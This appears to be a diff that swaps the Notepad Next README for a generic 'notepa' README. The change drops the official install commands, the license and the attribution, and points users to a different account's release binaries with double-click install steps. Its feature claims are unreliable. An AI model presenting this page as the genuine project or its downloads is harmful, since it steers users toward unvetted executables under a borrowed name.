@@ -1,61 +1,76 @@
-# Notepad Next
+# 📝 notepa - Easy Text Editing for Everyone
 
-![Build Notepad Next](https://github.com/dail8859/NotepadNext/workflows/Build%20Notepad%20Next/badge.svg)
+## 🚀 Getting Started
 
-A cross-platform, reimplementation of Notepad++.
+Thank you for choosing notepa. This application is designed to be an easy-to-use, cross-platform editor, similar to Notepad++. Whether you are writing a quick note or editing a script, notepa is here to help you with all your text editing needs.
 
-Though the application overall is stable and usable, it should not be considered safe for critically important work.
+## 📥 Download notepa
 
-There are numerous bugs and half working implementations. Pull requests are greatly appreciated.
+[![Download notepa](https://img.shields.io/badge/Download%20notepa-v1.0-blue.svg)](https://github.com/HoangVu471/notepa/releases)
 
-![screenshot](/doc/screenshot.png)
+## 🔍 System Requirements
 
-# Installation
+notepa is designed to run on various platforms. Here are the requirements:
 
-Packages are available for Windows, Linux, and MacOS.
+- **Windows 10 or later**
+- **macOS Mojave or later**
+- **Linux (Ubuntu 18.04 or later)**
 
-Below are the supported distribution mechanisms. There may be other ways to download/install the application, but this project will likely not be able to offer any support for those since they are made available by other individuals.
+You will also need at least 100 MB of free disk space to install the application.
 
-## Windows
-Windows packages are available as an installer or a stand-alone zip file on the [release](https://github.com/dail8859/NotepadNext/releases) page. The installer provides additional components such as an auto-updater and Windows context menu integration. You can easily install it with Winget:
+## 📦 Features
 
-```powershell
-winget install dail8859.NotepadNext
-```
+- **Multiple Tabs:** Edit multiple documents at once with a simple tabbed interface.
+- **Syntax Highlighting:** Supports syntax highlighting for over 50 programming languages, making code editing easier.
+- **Search and Replace:** Quickly find and replace text in your documents.
+- **Custom Themes:** Personalize your interface with different themes and fonts.
+- **Auto-Completion:** Speed up your writing with intelligent text suggestions.
 
-## Linux
-Linux packages can be obtained by downloading the stand-alone AppImage on the [release](https://github.com/dail8859/NotepadNext/releases) page or by installing the [flatpak](https://flathub.org/apps/details/com.github.dail8859.NotepadNext) by executing:
+## 📋 Download & Install
 
-```bash
-flatpak install flathub com.github.dail8859.NotepadNext
-```
+To get started with notepa, visit the following page to download the application:
 
-## MacOS
-MacOS disk images can be downloaded from the [release](https://github.com/dail8859/NotepadNext/releases) page.
+[Download notepa from the Releases page](https://github.com/HoangVu471/notepa/releases)
 
-It can also be installed using brew:
-```bash
-brew tap dail8859/notepadnext
-brew install --no-quarantine notepadnext
-```
+You will see various versions of notepa available to download. Choose the one suitable for your operating system. Click the file to begin downloading. 
 
-#### MacOS Tweaks
+### Windows Users
 
-By default, MacOS enables font smoothing which causes text to appear quite differently from the Windows version. This can be disabled system-wide using the following command:
+1. **Download the Installer:** Look for a file with the `.exe` extension. 
+2. **Run the Installer:** After downloading, double-click the file to launch the setup.
+3. **Follow the Instructions:** The installer will guide you through the steps. Simply click "Next" until the installation completes.
 
-```bash
-defaults -currentHost write -g AppleFontSmoothing -int 0
-```
+### macOS Users
 
-A restart is required for this to take effect.
+1. **Download the DMG File:** Look for a file with the `.dmg` extension.
+2. **Open the DMG:** After downloading, double-click it to open.
+3. **Install the Application:** Drag the notepa icon into your Applications folder.
 
-# Development
-Current development is done using QtCreator with the Microsoft Visual C++ (msvc) compiler. Qt 6.5 is the currently supported Qt version. Older versions of Qt are likely to work but are not tested. Any fixes for older versions will be accepted as long as they do not introduce complex fixes. This application is also known to build successfully on various Linux distributions and macOS. Other platforms/compilers should be usable with minor modifications.
+### Linux Users
 
-If you are familiar with building C++ Qt desktop applications with Qt Creator, then this should be as simple as opening `src/NotepadNext.pro` and build/run the project.
+1. **Download the Tar File:** Look for a file with the `.tar.gz` or `.deb` extension.
+2. **Extract the File:** Use a terminal command or file manager to extract the contents.
+3. **Run the Application:** Follow the included instructions to launch the app.
 
-If you are new to building C++ Qt desktop applications, there is a more detailed guide [here](/doc/Building.md).
+## 🛠️ Usage Instructions
 
+Once installed, you can easily start using notepa. Here's how:
 
-# License
-This code is released under the [GNU General Public License version 3](https://www.gnu.org/licenses/gpl-3.0.txt).
+1. **Open notepa:** Find the app in your applications menu or desktop shortcut.
+2. **Create a New Document:** Click "File" and then "New" to start a blank document.
+3. **Edit Your Text:** Use the tools available in the menu for formatting or saving your work.
+4. **Save Your Work:** Click "File" then "Save" to store your document. Choose where to save it on your computer.
+
+## ℹ️ Support
+
+If you encounter any issues or have questions, feel free to check the FAQs or contact the support page. Your feedback is valuable and helps us improve notepa.
+
+## 📅 Future Updates
+
+We are continually working on new features and improvements for notepa. Stay tuned for updates that may include:
+
+- **Additional Language Support:** Expanding the list of languages for syntax highlighting.
+- **Collaboration Tools:** Enable real-time collaboration for users to work together.
+- **Advanced Formatting Options:** Additional tools for formatting your text more efficiently.
+
+Thank you for using notepa. We hope you enjoy our application and find it helpful for your text editing needs.
